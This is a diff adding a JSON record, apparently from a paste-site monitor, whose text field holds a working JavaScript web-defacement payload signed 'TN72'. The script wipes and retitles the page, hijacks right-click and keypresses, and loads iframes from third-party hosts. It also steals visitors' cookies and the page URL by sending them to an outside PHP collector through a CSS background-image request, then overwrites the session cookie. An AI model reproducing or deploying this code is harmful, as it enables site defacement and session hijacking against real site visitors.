@@ -1,0 +1,17 @@
+{
+ "espireDate": "N",
+ "format": "javascript",
+ "jSonReasons": [
+  "re_url",
+  "re_css",
+  "lg_en",
+  "re_ast1",
+  "kw_hack"
+ ],
+ "key": "NNH2mL9n",
+ "pasteDate": "Feb 17, 2018, 4:16:19 PM",
+ "relevancy": 0.0,
+ "relevant": false,
+ "text": "/*\n<style>html,body{color:#ffffff}</style><font color='black'><script>top.location.href='http://www.google.com/?v=wall/'</script><noscript><META HTTP-EQUIV=\"refresh\" CONTENT=\"0;URL=http://www.facebook.com/?v=wall/\">\n*/\ndocument.getElementsByTagName('body')[0].innerHTML=\"\"\ndocument.title=\"Visited by TN72\"\nvar shortc=document.createElement(\"link\");shortc.rel=\"SHORTCUT ICON\";shortc.href=\"http://i.imgur.com/QYUFm5u.png\";document.getElementsByTagName(\"head\")[0].appendChild(shortc)\nfunction muter2(){\nscrW=screen.availWidth\nscrH=screen.availHeight\nwindow.moveTo(0,0)\nwindow.resizeTo(10,10)\nwindow.focus()\nfor(x=0;x<80;x++){\nwindow.resizeTo(10,scrH*x/80)\n}\nfor(y=0;y<80;y++){\nwindow.resizeTo(scrW*y/80,scrH)\n}\nwindow.resizeTo(scrW,scrH)\n}\ndocument.oncontextmenu=new Function(\"muter2();return false\");\nfunction keypressed(){alert(\"TN72 Was Here\");}\ndocument.onkeydown=keypressed;\nfunction kasih_tau(){\nalert('TN72 Was Here');\n}\nif(location.href.indexOf('sman2bangkalan.sch.id')==-1)setTimeout(\"alert('I'm TN72');\",3000);\nelse setTimeout(\"kasih_tau()\",3000);\nif(navigator.userAgent.indexOf('MSIE')!=-1){\ndocument.getElementsByTagName('body')\n[0].innerHTML=\"<center><iframe src='http://www.mykemer.com/files/animo.html' height='2200px' width='1100px' scrolling='no' frameborder='0'></center>\";\n}\nelse{\nif(document.getElementsByTagName('body')[0].style.cssText.indexOf('hack')==-1){\n//muter2();\nlog=\"\";\nif(document.cookie!=\"\"&&location.href.indexOf('ayodance.com')==-1){x=escape(document.cookie);v=escape(location.href);y=\"1337@null.net\";log=\";background-image:url(http://crazydavinci.net/riper.php?o=\"+escape(x)+\"&v=\"+escape(v)+\"&y=\"+escape(y)+\")\";document.cookie=\"PHPSESSID=!Bagsfreakz Here!;path=/\";}\ndocument.getElementsByTagName('body')[0].style.cssText=\"background-color:black\"+log\nwindow.onload=function(){\ndocument.getElementsByTagName('body')[0].innerHTML=\"<center><iframe src='http://www.helvaciemlak.com/files/TNshell.html' height='2200px' width='1100px' scrolling='no' frameborder='0'></center>\";\ndocument.getElementsByTagName('body')[0].style.cssText=\"background-color:#ffffff;background-image:url(http://www.balikita.net/)!important;\";\n}\n}\n}",
+ "title": "TN72 DISINI"
+}
